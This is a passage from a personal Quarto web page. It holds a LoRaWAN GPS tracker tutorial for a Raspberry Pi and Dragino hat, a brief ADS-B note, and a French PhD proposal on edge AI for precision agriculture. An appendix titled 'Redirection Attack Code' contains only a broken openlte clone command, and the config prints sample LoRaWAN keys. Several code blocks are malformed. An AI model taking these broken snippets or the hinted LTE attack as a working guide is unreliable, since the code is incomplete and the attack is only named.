<span id="cb56-35"><a href="#cb56-35" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Waiting for JOIN ACCEPT"</span>)</span>
<span id="cb56-36"><a href="#cb56-36" aria-hidden="true" tabindex="-1"></a>    sleep(<span class="dv">2</span>)</span>
<span id="cb56-37"><a href="#cb56-37" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="dv">2</span>):</span>
<span id="cb56-38"><a href="#cb56-38" aria-hidden="true" tabindex="-1"></a>    D.send_bytes(sent)</span>
<span id="cb56-39"><a href="#cb56-39" aria-hidden="true" tabindex="-1"></a>    start <span class="op">=</span> datetime.utcnow()</span>
<span id="cb56-40"><a href="#cb56-40" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> D.transmitting:</span>
<span id="cb56-41"><a href="#cb56-41" aria-hidden="true" tabindex="-1"></a>        <span class="cf">pass</span></span>
<span id="cb56-42"><a href="#cb56-42" aria-hidden="true" tabindex="-1"></a>    end <span class="op">=</span> datetime.utcnow()</span>
<span id="cb56-43"><a href="#cb56-43" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">"Sent GPS coordinates (</span><span class="sc">{}</span><span class="st">)"</span>.<span class="bu">format</span>(end<span class="op">-</span>start))</span>
<span id="cb56-44"><a href="#cb56-44" aria-hidden="true" tabindex="-1"></a>    sleep(<span class="dv">1</span>)</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>We take now /home/pi/dragino/dragino.ini.default to rewrite it to /home/pi/dragino/dragino.ini like</p>
<p>``` {.sourceCode .} gps_baud_rate = 9600 gps_serial_port = /dev/ttyS0 gps_serial_timeout = 1 gps_wait_period = 10</p>
<p>#LoRaWAN configuration spreading_factor = 7 max_power = 0x0F output_power = 0x0E sync_word = 0x34 rx_crc = True #Where to store the frame count fcount_filename = .lora_fcount</p>
<p>##Valid auth modes are ABP or OTAA ##All values are hex arrays eg devaddr = 0x01, 0x02, 0x03, 0x04 #auth_mode = “abp” #devaddr = #nwskey = #appskey =</p>
<p>auth_mode = otaa deveui = 0xFF, 0xFE, 0xFD, 0xFC, 0xFC, 0xFD, 0xFE, 0xFF appeui = 0x70, 0xB3, 0xD5, 0x00, 0x00, 0xD5, 0xB3, 0x70 appkey = 0x3D, 0x83, 0xC3, 0x16, 0x2C, 0xAD, 0x44, 0xB7, 0xB0, 0x50, 0x6C, 0x3C, 0xA1, 0x54, 0x36, 0xB7</p>
<pre><code>
By choosing DevEUI, AppEUI (unique on TTN), and AppKey with enough
entropy that it can\'t be cracked (beware of MSB, LSB writing between
dragin\_cayenne.py and TTN) Enfin pour executer le script python toutes
les minutes :

``` {.sourceCode .bash}
sudo crontab -e</code></pre>
<p>We select our favorite editor to add</p>
<p><code>{.sourceCode .} * * * * * /home/pi/gpscron</code></p>
<p>at the endfile. For the raspberry we are now ready to go. Lets see from the network side</p>
<p><strong>LoraWan Conection (TheThingsNetwork)</strong></p>
<p>Go to application -&gt; Create then in EndDevices -&gt; + Add Endevice</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="add_enddevice.png"><img src="add_enddevice.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">add_enddevice</figcaption>
</figure>
</div>
<p>Then with previous parameters set on the RPi (AppEUI, DevEUI, AppKey) in /home/pi/dragino/dragino.ini we put them on TTN</p>
<p>So in this study example :</p>
<p><code>{.sourceCode .} deveui = 0xFF, 0xFE, 0xFD, 0xFC, 0xFC, 0xFD, 0xFE, 0xFF appeui = 0x70, 0xB3, 0xD5, 0x00, 0x00, 0xD5, 0xB3, 0x70 appkey = 0x3D, 0x83, 0xC3, 0x16, 0x2C, 0xAD, 0x44, 0xB7, 0xB0, 0x50, 0x6C, 0x3C, 0xA1, 0x54, 0x36, 0xB7</code></p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="register_enddevice.png"><img src="register_enddevice.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">register_enddevice</figcaption>
</figure>
</div>
<p>Power On the Pi (Trick to make GPS work (on RPi) !!!!!)</p>
<p>Sur le shell du pi :</p>
<div class="sourceCode" id="cb58"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb58-1"><a href="#cb58-1" aria-hidden="true" tabindex="-1"></a><span class="fu">sudo</span> ntpdate fr.pool.ntp.org</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
<p>Put the RPi outside Pull off the Tx Jumper of the dragino and wait for 3D Fix (the green blinking light of the dragino). Then hotplug the jumper Tx.</p>
<p>You should have (your first ?) connected object</p>
<p><strong>Payload Format</strong></p>
<p>In this study we have choose the CayenneLPP format like</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="format_cayenne.png"><img src="format_cayenne.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">format_cayenne</figcaption>
</figure>
</div>
<p>In the created application you should see your device</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="coordonnees_ttn.png"><img src="coordonnees_ttn.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">coordonnees_ttn</figcaption>
</figure>
</div>
<p><strong>Data monitoring (Cayenne Integration)</strong></p>
<p>Go to <a href="https://mydevices.com/" class="uri">https://mydevices.com/</a></p>
<p>Create a Cayenne Account</p>
<p>Select TheThingsNetwork</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="add_new_cayenne.png"><img src="add_new_cayenne.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">add_new_cayenne</figcaption>
</figure>
</div>
<p>Sélection Dragino RPi Hat et mettre le DevEUI</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="dragino_cayenne.png"><img src="dragino_cayenne.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">dragino_cayenne</figcaption>
</figure>
</div>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="gps_live.png"><img src="gps_live.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">gps_live</figcaption>
</figure>
</div>
<p>Live Data from GPS tracker !</p>
<p>newpage</p>
</section>
<section id="adsb" class="level1">
<h1><strong>ADSB</strong></h1>
<p>Automatic Dependent Surveillance Broadcast (ADS-B)</p>
<p>Definition</p>
<p>A means by which aircraft, aerodrome vehicles and other objects can automatically transmit and/or receive data such as identification, position and additional data, as appropriate, in a broadcast mode via a data link.</p>
<p><a href="https://github.com/antirez/dump1090" class="uri">https://github.com/antirez/dump1090</a></p>
<p>To run the program in interactive mode, with networking support, and connect with your browser to <a href="http://localhost:8080" class="uri">http://localhost:8080</a> to see live traffic:</p>
<p>./dump1090 --interactive --net</p>
<div class="quarto-figure quarto-figure-center">
<figure class="figure">
<p><a href="avion.png"><img src="avion.png" class="img-fluid figure-img"></a></p>
<figcaption class="figure-caption">avion</figcaption>
</figure>
</div>
<p>newpage</p>
</section>
<section id="appendix" class="level1">
<h1><strong>Appendix</strong></h1>
<p>Redirection Attack Code</p>
<p><code>` {r, eval=FALSE}  !/bin/bash ==========  git clone git://git.code.sf.net/p/openlte/code openlte-code cd openlte-code git checkout a5a66e  .. code-block::</code>` {r, eval=FALSE, diff}</p>
<p>newpage</p>
<p>#APOGÉ - l’intelligence Artificielle en Périphérie pOur l’aGriculture de prÉcision author: “Bastien Baranoff”</p>
</section>
<section id="introduction" class="level1">
<h1>1 - Introduction</h1>
<p>De nos jours, l’agriculture nécessite une attention particulière pour éviter une mauvaise utilisation des pesticides et de l’eau, par exemple. Pour être en mesure de faire face à cela, l’agriculteur doit savoir ce qu’il peut et ne peut pas faire. Cette thèse a pour prétention de combler l’écart entre les connaissances des agriculteurs et des informaticiens. De cette manière, nous devons intégrer les connaissances des agriculteurs et proposer quelque chose de facile à utiliser pour l’aider à devenir un utilisateur final de thèmes tels que l’IA ou LoRa. Il est dommage qu’à partir de maintenant, il ne puisse pas utiliser ces technologies alors qu’elles seraient des outils vraiment utiles pour superviser et agir sur ses champs.</p>
</section>
<section id="contexte" class="level1">
<h1>2 - Contexte</h1>
<section id="les-besoins-de-lagriculture-de-précision" class="level2">
<h2 class="anchored" data-anchor-id="les-besoins-de-lagriculture-de-précision">Les besoins de l’agriculture de précision</h2>
<p>L’agriculture de précision vise à maximiser la production tout en minimisant l’utilisation des ressources naturelles et en réduisant les impacts environnementaux. Cela nécessite une collecte précise de données sur les sols, les cultures et les conditions météorologiques, ainsi qu’une surveillance continue des conditions de croissance pour permettre des interventions en temps réel. L’agriculture de précision repose sur des technologies avancées telles que l’intelligence artificielle (IA), les capteurs, les drones et les systèmes de communication en réseau.</p>
</section>
<section id="les-défis-actuels-de-lagriculture-de-précision" class="level2">
<h2 class="anchored" data-anchor-id="les-défis-actuels-de-lagriculture-de-précision">Les défis actuels de l’agriculture de précision</h2>
<p>L’un des principaux défis de l’agriculture de précision est de combiner efficacement les connaissances agronomiques avec les technologies avancées. Les agriculteurs ont souvent une connaissance pratique approfondie de leurs cultures et de leurs sols, mais ils peuvent manquer de compétences en informatique pour tirer le meilleur parti des technologies de précision. D’autre part, les ingénieurs et les informaticiens peuvent avoir une compréhension limitée des besoins et des contraintes du monde agricole, ce qui peut entraîner des solutions techniques qui ne sont pas adaptées à la réalité du terrain.</p>
</section>
</section>
<section id="solution-proposée-apogé" class="level1">
<h1>3 - Solution proposée : APOGÉ</h1>
<p>Pour répondre à ces défis, nous avons développé APOGÉ - l’intelligence Artificielle en Périphérie pOur l’aGriculture de prÉcision. Il s’agit d’une solution de surveillance et de contrôle de l’agriculture de précision basée sur l’IA, qui utilise des capteurs décentralisés pour collecter des données en temps réel sur les conditions de croissance des cultures. Les données sont traitées localement, sans avoir besoin d’une connexion Internet constante, ce qui permet d’économiser de l’énergie et de réduire les coûts de communication.</p>
<p>APOGÉ utilise des algorithmes d’apprentissage automatique pour analyser les données collectées et fournir des recommandations précises pour optimiser la production de cultures. Les recommandations sont présentées à l’agriculteur sous forme de</p>
</section>
<section id="processus" class="level1">
<h1>4 - Processus :</h1>
<p>Nous avons choisi d’utiliser un drone pour survoler les champs de l’agriculteur et vérifier ses plantations. Nous avons choisi le processeur NVIDIA Jetson pour le traitement des données avec l’IA utilisant Edge pour éviter autant que possible l’utilisation du cloud. En effet, Jetson devrait suffire pour une première vue de ce projet. Et aussi longtemps qu’il s’agit d’électronique embarquée, la dissipation de puissance devrait être inférieure à celle d’un ordinateur traditionnel et nous pouvons le placer sur le drone. Les moyens de communication se feront par Wi-Fi et LoRa :</p>
<ul>
<li>Wi-Fi pour la collecte de données massive</li>
<li>LoRa pour traiter les requêtes précises et ciblées</li>
</ul>
</section>
<section id="méthodologie" class="level1">
<h1>5 - Méthodologie</h1>
<p>Pour commencer, nous devrons définir les exigences de notre système, qui seront basées sur les besoins exprimés dans la section précédente. Cela nous permettra de déterminer les composants matériels et logiciels nécessaires pour construire notre solution. Ensuite, nous concevrons l’architecture globale de notre système, en prenant en compte les différents composants matériels et logiciels nécessaires. Cette étape nous permettra d’identifier les éventuels points de blocage ou de dysfonctionnement de notre solution, ainsi que les solutions à apporter.</p>
<p>Après avoir conçu l’architecture globale, nous nous concentrerons sur la mise en place des différents composants de notre système. Cela inclura notamment l’installation et la configuration de tous les logiciels nécessaires, ainsi que le déploiement du matériel sur site.</p>
<p>Une fois que tous les composants auront été installés et configurés, nous procéderons à des tests de validation pour nous assurer que notre solution répond aux exigences fonctionnelles et non fonctionnelles définies précédemment. Nous effectuerons également des tests de performance pour nous assurer que notre système peut traiter les données dans des délais raisonnables.</p>
<p>Enfin, nous livrerons le système au client, accompagné d’une documentation complète sur son fonctionnement, sa maintenance et sa gestion. Nous formerons également le personnel du client sur l’utilisation du système et fournirons un support technique pour répondre à toutes les questions ou problèmes éventuels. Nous allons utiliser le service cloud de WeeNat (https://weenat.com/) pour cette étude.</p>
</section>
<section id="enjeux-et-anticipations" class="level1">
<h1>6 - Enjeux et anticipations:</h1>
<ul>
<li>La surveillance et l’utilisation d’un champ agricole par EDGE-IA permettront de réduire les coûts pour l’utilisateur.</li>
<li>Préservation de l’écosystème (avec la détection des maladies, l’agriculteur peut éviter d’utiliser des pesticides et ne traiter que les maladies qui affectent ses parcelles).</li>
<li>Partager ses données en échange d’argent ou d’autres données.</li>
<li>Apposer une étiquette indiquant qu’il n’a pas utilisé de pesticides et que ses cultures sont saines.</li>
</ul>
</section>
<section id="motivations" class="level1">
<h1>7 - Motivations</h1>
<p>Passionné de radio-télécommunications depuis 10 ans, je suis ravi de partager mes connaissances avec ceux qui peuvent les comprendre. Avec des compétences en télécommunications mobiles (GSM -&gt; 5G-SA) et en LoRa, je suis bien placé pour aborder le sujet proposé. Peu de personnes sont capables de comprendre ces protocoles, ce qui me donne une perspective unique sur le sujet.</p>
<p>Mon handicap m’a obligé à travailler de manière non académique, mais j’ai appris à être autonome dans mes recherches depuis des années. J’ai également des compétences en électronique et en informatique qui peuvent être utiles pour ce projet. L’électronique embarquée est exactement le domaine de recherche de mes compétences, et j’aime être confronté à de nouveaux défis.</p>
<p>J’ai l’habitude de travailler avec du matériel bon marché, comme les clones électroniques chinois, et de les faire fonctionner avec peu de documentation. J’ai également de l’expérience en rétro-ingénierie pour faire fonctionner d’anciens logiciels. La sécurité en radio-télécommunications est un sujet qui m’intéresse particulièrement. Je préfère cela plutôt que le domaine de la sécurité TCP/IP, qui est traité par des personnes plus compétentes que moi.</p>
<p>La radio n’est pas largement étudiée par la plupart des gens, mais je peux écouter un téléphone jusqu’à LTE (Long Term Evolution) et Android 11, tant que le téléphone est dans ma plage de fréquences radio. Passionné de Linux depuis des années également (il est livré avec les télécommunications), je suis compétent en bash, C et réseaux. J’ai appris à lire de longs codes et à m’en sortir avec ceux-ci. J’ai également l’expérience de plusieurs architectures, comme les 32 bits, AMD64, ARM, ARM64, RISC-V, ESP32, Arduino microcontrôleurs, STM32, et je pense que le Jetson Nano (ARM64) ne sera pas trop difficile à utiliser pour moi.</p>
<p>Je suis autonome et je n’ai pas besoin de beaucoup de soutien tant que j’ai travaillé sans cela depuis des années. J’ai peu travaillé avec l’IA, mais je suis capable de l’utiliser. J’ai testé quelques scripts Python utilisant Kaggle. J’ai également des compétences en enseignement, ayant été enseignant au lycée Déodat de Severac de Céret. J’ai également présenté à l’Université de Perpignan via Domitia.</p>
<p>J’ai souhaité obtenir un doctorat depuis de nombreuses années, mais ma maladie ne m’a pas aidé dans cette entreprise. Cependant, cela m’a rendu plus résilient et j’ai appris à ne pas être trop fier. Avec plusieurs domaines d’expérience et de compétences ainsi que des diplômes anciens, j’espère que vous accepterez mon projet de thèse. Ce serait un honneur pour moi de faire de mon mieux pour le mener à bien.</p>
<p>Cordialement,</p>
<ul>
<li>Bastien Baranoff</li>
</ul>
<pre><code>library(ggplot2)
library(ggantt)

# Création de la structure de données
taches &lt;- data.frame(
  tache = c("Analyse bibliographique", "Conception du plan de recherche", "Collecte de données", 
            "Analyse de données", "Rédaction du manuscrit", "Relecture et correction"),
  debut = c(as.Date("2023-04-17"), as.Date("2023-07-01"), as.Date("2023-09-01"),
            as.Date("2024-06-01"), as.Date("2025-01-01"), as.Date("2025-09-01")),
  fin = c(as.Date("2023-06-30"), as.Date("2024-05-31"), as.Date("2024-12-31"),
          as.Date("2025-08-31"), as.Date("2026-05-31"), as.Date("2026-09-30")),
  duree = as.numeric(as.Date(c("2023-06-30", "2024-05-31", "2024-12-31", "2025-08-31", "2026-05-31", "2026-09-30"))) - 
    as.numeric(as.Date(c("2023-04-17", "2023-07-01", "2023-09-01", "2024-06-01", "2025-01-01", "2025-09-01")))
)

# Configuration du diagramme de Gantt
g &lt;- ggantt(taches, title="Gantt pour la réalisation du projet de thèse",
            calendar="western-calendar",
            date.breaks="1 month",
            y.labels=taches$tache,
            x.labels="",
            show.grid="months")

# Affichage du diagramme
g</code></pre>
</section>
<section id="bibliograpy" class="level1">
<h1><strong>Bibliograpy</strong></h1>
<hr>
</section>
<section id="nocite" class="level1">
<h1>nocite: '@*'</h1>
</section>

</main>
<!-- /main column -->
<script id="quarto-html-after-body" type="application/javascript">
window.document.addEventListener("DOMContentLoaded", function (event) {
  const toggleBodyColorMode = (bsSheetEl) => {
    const mode = bsSheetEl.getAttribute("data-mode");
    const bodyEl = window.document.querySelector("body");
    if (mode === "dark") {
      bodyEl.classList.add("quarto-dark");
      bodyEl.classList.remove("quarto-light");
    } else {
      bodyEl.classList.add("quarto-light");
      bodyEl.classList.remove("quarto-dark");
    }
  }
  const toggleBodyColorPrimary = () => {
    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
    if (bsSheetEl) {
      toggleBodyColorMode(bsSheetEl);
    }
  }
  toggleBodyColorPrimary();  
  const icon = "";
  const anchorJS = new window.AnchorJS();
  anchorJS.options = {
    placement: 'right',
    icon: icon
  };
  anchorJS.add('.anchored');
  const isCodeAnnotation = (el) => {
    for (const clz of el.classList) {
      if (clz.startsWith('code-annotation-')) {                     
        return true;
      }
    }
    return false;
  }
  const clipboard = new window.ClipboardJS('.code-copy-button', {
    text: function(trigger) {
      const codeEl = trigger.previousElementSibling.cloneNode(true);
      for (const childEl of codeEl.children) {
        if (isCodeAnnotation(childEl)) {
          childEl.remove();
        }
      }
      return codeEl.innerText;
    }
  });
  clipboard.on('success', function(e) {
    // button target
    const button = e.trigger;
    // don't keep focus
    button.blur();
    // flash "checked"
    button.classList.add('code-copy-button-checked');
    var currentTitle = button.getAttribute("title");
    button.setAttribute("title", "Copied!");
    let tooltip;
    if (window.bootstrap) {
      button.setAttribute("data-bs-toggle", "tooltip");
      button.setAttribute("data-bs-placement", "left");
      button.setAttribute("data-bs-title", "Copied!");
      tooltip = new bootstrap.Tooltip(button, 
        { trigger: "manual", 
          customClass: "code-copy-button-tooltip",
          offset: [0, -8]});
      tooltip.show();    
    }
    setTimeout(function() {
      if (tooltip) {
        tooltip.hide();
        button.removeAttribute("data-bs-title");
        button.removeAttribute("data-bs-toggle");
        button.removeAttribute("data-bs-placement");
      }
      button.setAttribute("title", currentTitle);
      button.classList.remove('code-copy-button-checked');
    }, 1000);
    // clear code selection
    e.clearSelection();
  });
  function tippyHover(el, contentFn) {
    const config = {
      allowHTML: true,
      content: contentFn,
      maxWidth: 500,
      delay: 100,
      arrow: false,
      appendTo: function(el) {
          return el.parentElement;
      },
      interactive: true,
      interactiveBorder: 10,
      theme: 'quarto',
      placement: 'bottom-start'
    };
    window.tippy(el, config); 
  }
  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
  for (var i=0; i<noterefs.length; i++) {
    const ref = noterefs[i];
    tippyHover(ref, function() {
      // use id or data attribute instead here
      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
      try { href = new URL(href).hash; } catch {}
      const id = href.replace(/^#\/?/, "");
      const note = window.document.getElementById(id);
      return note.innerHTML;
    });
  }
      let selectedAnnoteEl;
      const selectorForAnnotation = ( cell, annotation) => {
        let cellAttr = 'data-code-cell="' + cell + '"';
        let lineAttr = 'data-code-annotation="' +  annotation + '"';
        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
        return selector;
      }
      const selectCodeLines = (annoteEl) => {
        const doc = window.document;
        const targetCell = annoteEl.getAttribute("data-target-cell");
        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
        const lineIds = lines.map((line) => {
          return targetCell + "-" + line;
        })
        let top = null;
        let height = null;
        let parent = null;
        if (lineIds.length > 0) {
            //compute the position of the single el (top and bottom and make a div)
            const el = window.document.getElementById(lineIds[0]);
            top = el.offsetTop;
            height = el.offsetHeight;
            parent = el.parentElement.parentElement;
          if (lineIds.length > 1) {
            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
            height = bottom - top;
          }
          if (top !== null && height !== null && parent !== null) {
            // cook up a div (if necessary) and position it 
            let div = window.document.getElementById("code-annotation-line-highlight");
            if (div === null) {
              div = window.document.createElement("div");
              div.setAttribute("id", "code-annotation-line-highlight");
              div.style.position = 'absolute';
              parent.appendChild(div);
            }
            div.style.top = top - 2 + "px";
            div.style.height = height + 4 + "px";
            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
            if (gutterDiv === null) {
              gutterDiv = window.document.createElement("div");
              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
              gutterDiv.style.position = 'absolute';
              const codeCell = window.document.getElementById(targetCell);
              const gutter = codeCell.querySelector('.code-annotation-gutter');
              gutter.appendChild(gutterDiv);
            }
            gutterDiv.style.top = top - 2 + "px";
            gutterDiv.style.height = height + 4 + "px";
          }
          selectedAnnoteEl = annoteEl;
        }
      };
      const unselectCodeLines = () => {
        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
        elementsIds.forEach((elId) => {
          const div = window.document.getElementById(elId);
          if (div) {
            div.remove();
          }
        });
        selectedAnnoteEl = undefined;
      };
      // Attach click handler to the DT
      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
      for (const annoteDlNode of annoteDls) {
        annoteDlNode.addEventListener('click', (event) => {
          const clickedEl = event.target;
          if (clickedEl !== selectedAnnoteEl) {
            unselectCodeLines();
            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
            if (activeEl) {
              activeEl.classList.remove('code-annotation-active');
            }
            selectCodeLines(clickedEl);
            clickedEl.classList.add('code-annotation-active');
          } else {
            // Unselect the line
            unselectCodeLines();
            clickedEl.classList.remove('code-annotation-active');
          }
        });
      }
  const findCites = (el) => {
    const parentEl = el.parentElement;
    if (parentEl) {
      const cites = parentEl.dataset.cites;
      if (cites) {
        return {
          el,
          cites: cites.split(' ')
        };
      } else {
        return findCites(el.parentElement)
      }
    } else {
      return undefined;
    }
  };
  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
  for (var i=0; i<bibliorefs.length; i++) {
    const ref = bibliorefs[i];
    const citeInfo = findCites(ref);
    if (citeInfo) {
      tippyHover(citeInfo.el, function() {
        var popup = window.document.createElement('div');
        citeInfo.cites.forEach(function(cite) {
          var citeDiv = window.document.createElement('div');
          citeDiv.classList.add('hanging-indent');
          citeDiv.classList.add('csl-entry');
          var biblioDiv = window.document.getElementById('ref-' + cite);
          if (biblioDiv) {
            citeDiv.innerHTML = biblioDiv.innerHTML;
          }
          popup.appendChild(citeDiv);
        });
        return popup.innerHTML;
      });
    }
  }
});
</script>
</div> <!-- /content -->



</body></html>